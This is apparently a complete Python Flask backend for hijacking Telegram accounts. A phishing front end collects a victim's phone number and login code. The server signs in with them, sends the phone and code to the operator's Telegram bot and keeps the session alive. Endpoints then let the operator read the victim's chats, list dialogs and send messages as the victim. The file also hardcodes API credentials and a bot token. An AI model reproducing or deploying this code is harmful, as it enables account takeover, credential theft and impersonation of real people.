from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
import secrets
from datetime import datetime
from pathlib import Path

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
CORS(app)

API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
YOUR_CHAT_ID = "8796685138"

# Store active sessions
active_sessions = {}
SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)

def send_to_telegram_bot(phone, code, session_id):
    message = f"""
🔐 **Login Details**

🆔 **Session ID:** `{session_id}`
📱 **Phone:** `{phone}`
🔑 **Code:** `{code}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": YOUR_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        # Generate unique session ID
        session_id = secrets.token_hex(8)
        
        # Start async task to create session
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def create_and_store_session():
            client = None
            try:
                # Create client with persistent session file
                session_file = SESSIONS_DIR / f"{session_id}"
                client = Client(
                    name=str(session_file),
                    api_id=API_ID,
                    api_hash=API_HASH,
                    workdir=str(Path.cwd())
                )
                
                await client.connect()
                
                # Send code request to Telegram
                sent_code = await client.send_code(phone_number=phone)
                
                # Store the client and phone in active sessions
                active_sessions[session_id] = {
                    'client': client,
                    'phone': phone,
                    'phone_code_hash': sent_code.phone_code_hash,
                    'session_file': str(session_file),
                    'created_at': datetime.now().timestamp()
                }
                
                print(f"Session {session_id} created for {phone}")
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'message': 'Code sent to your Telegram'
                }
                
            except Exception as e:
                if client:
                    await client.disconnect()
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(create_and_store_session())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        session_id = data.get('session_id', '')
        code = data.get('code', '')
        
        if not session_id or not code:
            return jsonify({'success': False, 'error': 'Session ID and code required'}), 400
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Request new code.'}), 400
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def complete_login():
            try:
                # Complete the login with the code
                await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
                
                # Session is now fully logged in!
                # Send phone and code to bot
                send_to_telegram_bot(phone, code, session_id)
                
                # Get user info to confirm login
                me = await client.get_me()
                
                return {
                    'success': True,
                    'message': f'Logged in as {me.first_name} {me.last_name or ""}',
                    'session_id': session_id,
                    'user': {
                        'id': me.id,
                        'first_name': me.first_name,
                        'username': me.username
                    }
                }
                
            except Exception as e:
                error_msg = str(e)
                if 'PHONE_CODE_INVALID' in error_msg:
                    return {'success': False, 'error': 'Invalid code'}
                elif 'PHONE_CODE_EXPIRED' in error_msg:
                    return {'success': False, 'error': 'Code expired'}
                else:
                    return {'success': False, 'error': error_msg}
        
        result = loop.run_until_complete(complete_login())
        
        # Don't delete session - keep it alive for later use
        # The session remains in active_sessions
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/get-messages', methods=['POST'])
def get_messages():
    """Use the stored session to read messages"""
    try:
        data = request.json
        session_id = data.get('session_id', '')
        chat_id = data.get('chat_id', 'me')  # 'me' = saved messages, or username/phone
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session not found. Login first.'}), 400
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def fetch_messages():
            try:
                messages = []
                async for message in client.get_chat_history(chat_id, limit=20):
                    messages.append({
                        'id': message.id,
                        'from': message.from_user.first_name if message.from_user else 'Unknown',
                        'text': message.text or message.caption or '[Media]',
                        'date': str(message.date)
                    })
                return {'success': True, 'messages': messages}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(fetch_messages())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/send-message', methods=['POST'])
def send_message():
    """Use the stored session to send a message"""
    try:
        data = request.json
        session_id = data.get('session_id', '')
        chat_id = data.get('chat_id', '')
        text = data.get('text', '')
        
        if not session_id or not chat_id or not text:
            return jsonify({'success': False, 'error': 'Session ID, chat_id, and text required'}), 400
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session not found. Login first.'}), 400
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def send():
            try:
                await client.send_message(chat_id, text)
                return {'success': True, 'message': 'Message sent'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(send())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/get-dialogs', methods=['POST'])
def get_dialogs():
    """Get all chats (dialogs) for the logged-in account"""
    try:
        data = request.json
        session_id = data.get('session_id', '')
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session not found. Login first.'}), 400
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def fetch_dialogs():
            try:
                dialogs = []
                async for dialog in client.get_dialogs(limit=30):
                    dialogs.append({
                        'chat_id': dialog.chat.id,
                        'name': dialog.chat.title or dialog.chat.first_name,
                        'username': dialog.chat.username,
                        'type': str(type(dialog.chat).__name__)
                    })
                return {'success': True, 'dialogs': dialogs}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(fetch_dialogs())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/active-sessions', methods=['GET'])
def list_active_sessions():
    """List all active sessions"""
    sessions = []
    for sid, data in active_sessions.items():
        sessions.append({
            'session_id': sid,
            'phone': data['phone'],
            'created_at': datetime.fromtimestamp(data['created_at']).isoformat()
        })
    return jsonify({'sessions': sessions})

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'active_sessions': len(active_sessions)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
